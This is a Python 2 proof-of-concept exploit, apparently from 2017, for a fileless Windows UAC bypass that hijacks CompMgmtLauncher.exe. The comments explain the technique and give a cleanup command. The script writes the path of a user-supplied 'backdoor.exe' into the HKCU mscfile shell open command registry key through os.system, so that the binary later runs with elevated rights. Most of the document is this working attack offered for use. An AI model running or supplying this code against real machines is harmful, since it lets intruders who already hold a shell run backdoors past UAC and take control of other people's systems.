import os,time,argparse

#+-------------------------------------------------+
#|   CompMgmtLauncher FileLess UAC BYPASS          | 
#|                                                 | 
#|            Discovered By Enigma                 |  
#|                                                 | 
#| POC Coded By Chaitanya Haritash ::: @bofheaded  |
#|                                                 |
#|      Suspicious Shell Activity 2017             |
#+-------------------------------------------------+

##
# Information
##

#Similar to the “eventvwr.exe” bypass, “CompMgmtLauncher.exe” checks for 
#the existence of a default HKCU\Software\Classes\mscfile\shell\open\command value, 
#if it doesn’t find it, it checks for the same in HKEY_CLASSES_ROOT and would typically 
#launch mmc.exe and in turn the Computer Management Console. 
#Since CompMgmtLauncher.exe’s first check in the registry for that key/value in 
#the HKEY_CURRENT_USER hive results in a “NAME NOT FOUND” (when investigating with procmon), 
#we can add those missing keys/value to launch a binary (along with parameters) of our choosing 
#essentially hijacking “CompMgmtLauncher.exe”‘s execution flow.

##
# Serverity ::: Medium
##
##
#Tested on ::: 
##
#Windows 7. Might work on 8, might work on 10, haven’t tried yet!

##
# NOTE :::
##
#The above PoC assumes you have a shell on a machine and your current user is an admin 
#with UAC enabled to anything other than “Always Notify”. This isn’t a privilege escalation 
#vulnerability, it’s a UAC Bypass 
#Remember to clean up so everything works “as normal” after you’ve run your code:
#     reg delete HKEY_CURRENT_USER\Software\Classes\mscfile /f

##
# MISC :::
##
#https://github.com/ChaitanyaHaritash/My-Exploits/tree/master/COMPMGMTLAUNCHER_UAC_BYPASS
#http://x42.obscurechannel.com/?p=368


def intro (self):
    global banner
    banner = """
+-------------------------------------------------+
|   CompMgmtLauncher FileLess UAC BYPASS          | 
|                                                 | 
|             Discovered By Enigma                |  
|                                                 | 
| POC Coded By Chaitanya Haritash ::: @bofheaded  |
|                                                 |
|        Suspicious Shell Activity 2017           |
+-------------------------------------------------+
"""

def main (self,):
    print banner
    parser = argparse.ArgumentParser()
    parser.add_argument("-p" ,
                        "--path" ,
                        help="Path to your backdoor.exe" ,
                        required="true")
    tim = parser.parse_args()
    try:
            os.system('reg add HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command /d "'+str(tim.path)+'" /f')
            time.sleep(2)
            #os.system('CompMgmtLauncher.exe')
    except:
        print "[!] This Windows Box Cannot Be Escalated [!]"
if __name__ == '__main__':
    intro("")
    main("")
